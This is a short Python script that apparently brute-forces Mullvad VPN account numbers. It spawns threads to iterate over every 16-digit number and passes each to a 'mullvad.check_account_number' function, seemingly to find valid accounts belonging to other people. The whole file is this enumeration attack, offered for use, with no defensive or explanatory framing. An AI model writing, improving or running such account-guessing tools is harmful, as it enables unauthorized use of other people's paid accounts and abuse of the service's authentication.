from threading import Thread, Semaphore
import mullvad

threads = []
max_threads = int(input("Enter the number of threads: "))
semaphore = Semaphore(max_threads)

def thread_function(account_number):
    with semaphore:
        mullvad.check_account_number(account_number)

for i in range(0000_0000_0000_0000, 9999_9999_9999_9999):
    thread = Thread(target=thread_function, args=(str(i).zfill(16),))

    thread.daemon = True
    thread.start()

    threads.append(thread)

for thread in threads:
    thread.join()
